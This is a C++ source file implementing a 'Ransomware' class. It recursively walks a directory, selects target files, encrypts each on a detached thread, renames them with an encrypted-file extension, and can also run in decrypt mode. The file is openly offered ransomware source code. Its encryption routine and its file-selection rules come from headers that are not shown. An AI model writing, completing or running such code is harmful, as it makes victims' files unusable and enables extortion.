#include "Ransomware.h"
#include <thread>
#include <boost/algorithm/string.hpp>
#include <filesystem>

Ransomware::Ransomware(const std::string& startingDirectory, RansomwareOperation ransomwareOperation)
	: m_startingDirectory(startingDirectory), m_ransomwareOperation(ransomwareOperation) {}

long Ransomware::Start()
{
	int filesEncrypted = 0;
	for (const auto& entry : std::filesystem::recursive_directory_iterator(m_startingDirectory))
	{
		std::string filePath(entry.path().string());
		if (!IsTargetFile(filePath))
			continue;

		auto callable = [=]() { CryptFile(filePath); };
		std::thread worker(callable);
		if (worker.joinable())
			worker.detach();

		filesEncrypted++;
		std::cout << filePath << "  -  " << filesEncrypted << std::endl;
	}

	return filesEncrypted;
}

bool Ransomware::IsTargetFile(const std::string& filePath)
{
	std::error_code ec;
	if (std::filesystem::file_size(filePath, ec) <= 0)
		return false;

	if (m_ransomwareOperation == Encrypt)
	{
		if (!m_fileEncryptionDecisions.ShouldIEncrypt(filePath))
			return false;
	}
	else
	{
		if (!boost::ends_with(filePath, ENCRYPTED_FILE_EXTENTION))
			return false;
	}
	return true;
}

void Ransomware::CryptFile(const std::string& filePath)
{
	crypt.cryptFile(filePath);
	m_fileEncryptionDecisions.EncryptedFileExtension(filePath);
}